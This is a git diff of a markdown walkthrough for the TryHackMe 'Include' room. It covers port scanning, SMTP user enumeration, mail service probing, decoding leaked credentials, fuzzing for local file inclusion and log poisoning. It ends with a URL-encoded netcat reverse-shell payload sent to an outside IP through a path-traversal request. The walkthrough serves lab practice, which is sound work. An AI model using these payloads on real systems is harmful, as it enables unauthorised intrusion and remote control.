@@ -21,7 +21,7 @@ Include is a **MEDIUM** difficulty room on [TryHackMe](https://tryhackme.com/r/r
 
 The initial Nmap scan shows 8 ports open, as follows:
 
-```
+```console
 22/open/tcp/ssh/OpenSSH8.2p1Ubuntu4ubuntu0.11(UbuntuLinux;protocol2.0)
 25/open/tcp/smtp/Postfixsmtpd
 110/open/tcp/pop3/Dovecotpop3d
@@ -40,8 +40,9 @@ This isn't an ancient version of SSH, so it's unlikely that we'll find an exploi
 
 Password authentication is supported, however the initial check for weak passwords failed. 
 
-```bash
-ssh root@$ip
+```console
+$ ssh root@$ip
+
 The authenticity of host '10.10.172.107 (10.10.172.107)' can't be established.
 ED25519 key fingerprint is SHA256:uURSOQLABB+Das+Emk8jQtlj9stf8TDyVdiz6DZmjoU.
 This key is not known by any other names.
@@ -61,8 +62,9 @@ We can move on from SSH for now.
 
 Using `telnet` to connect to the SMTP service, we're able to enumerate valid users on the system, as shown below. Note the message after attempting to send mail to a user that does not exist ("doesnotexist") compared to the message received after entering a user that does exist ("root").
 
-```bash
-telnet $ip 25
+```console
+$ telnet $ip 25
+
 Trying 10.10.172.107...
 Connected to 10.10.172.107.
 Escape character is '^]'.
@@ -87,15 +89,16 @@ Let's hold onto this for now and come back to it later.
 
 We can grab the IMAP banner with netcat.
 
-```bash
-nc -nv $ip 143
+```console
+$ nc -nv $ip 143
+
 Connection to 10.10.102.86 143 port [tcp/*] succeeded!
 * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS LOGINDISABLED] Dovecot (Ubuntu) ready.
 ```
 
 Trying to log in, we get an error that plaintext authentication is not authorized over the unencrypted channel (good!). 
 
-```bash
+```console
 A1 LOGIN th0m12 th0m12
 * BAD [ALERT] Plaintext authentication not allowed without SSL/TLS, but your client did it anyway. If anyone was listening, the password was exposed.
 A1 NO [PRIVACYREQUIRED] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
@@ -103,8 +106,9 @@ A1 NO [PRIVACYREQUIRED] Plaintext authentication disallowed on non-secure (SSL/T
 
 Connecting with openssl allows entering credentials, but since we don't have creds there's not much we can access. If nothing pans out with the other services, we might circle back to this to try brute forcing the credentials using the two usernames we've already enumerated. 
 
-```bash
-openssl s_client -connect $ip:993 -quiet
+```console
+$ openssl s_client -connect $ip:993 -quiet
+
 Can't use SSL_get_servername
 depth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal
 verify error:num=18:self-signed certificate
@@ -122,8 +126,9 @@ A1 BAD Error in IMAP command received by server.
 
 Similarly, I didn't get anything from the POP3 service running on the server either.
 
-```bash
-openssl s_client -connect $ip:995 -crlf -quiet
+```console
+$ openssl s_client -connect $ip:995 -crlf -quiet
+
 Can't use SSL_get_servername
 depth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal
 verify error:num=18:self-signed certificate
@@ -148,8 +153,8 @@ RETR 1
 
 After adding the IP to the `/etc/hosts` file with the command below we're able to browse to the first web app:
 
-```bash
-echo -n '10.10.188.130\tinclude.thm' | sudo tee -a /etc/hosts
+```console
+$ echo -n '10.10.188.130\tinclude.thm' | sudo tee -a /etc/hosts
 ```
 
 ![](images/tryhackme_include/Pasted%20image%2020240606202332.png)
@@ -191,8 +196,9 @@ When we enter that and hit "Update Banner Image", we get back the following resp
 
 Looks like a base64-encoded string.
 
-```bash
-echo 'eyJSZXZpZXdBcHBVc2VybmFtZS[...SNIP...]N0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=' | base64 -d | jq
+```console 
+$ echo 'eyJSZXZpZXdBcHBVc2VybmFtZS[...SNIP...]N0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=' | base64 -d | jq
+
 {
   "ReviewAppUsername": "admin",
   "ReviewAppPassword": "[REDACTED]",
@@ -227,8 +233,9 @@ To make this work with `ffuf` I saved the request to a file and then replaced "p
 
 Having configured the request file, we can run `ffuf` against it. 
 
-```bash
-ffuf -r -c -request req.txt -request-proto 'http' -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
+```console
+$ ffuf -r -c -request req.txt -request-proto 'http' -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
+
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -276,7 +283,7 @@ After some poking around, I found at least two that will probably work: `/var/lo
 
 Looking at `auth.log`:
 
-```
+```console
 HTTP/1.1 200 OK
 Date: Fri, 07 Jun 2024 13:13:51 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -320,11 +327,11 @@ From here, you can either list the contents of the `/var/www/html/` directory fr
 
 Using the following URL-encoded command I was able to get a reverse shell. I used [revshells.com](https://revshells.com) to generate this.
 
-```
+```console
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.2.113.252%209001%20%3E%2Ftmp%2Ff
 ```
 
-```
+```console
 GET /profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/auth.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.2.113.252%209001%20%3E%2Ftmp%2Ff HTTP/1.1
 Host: include.thm:50000
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
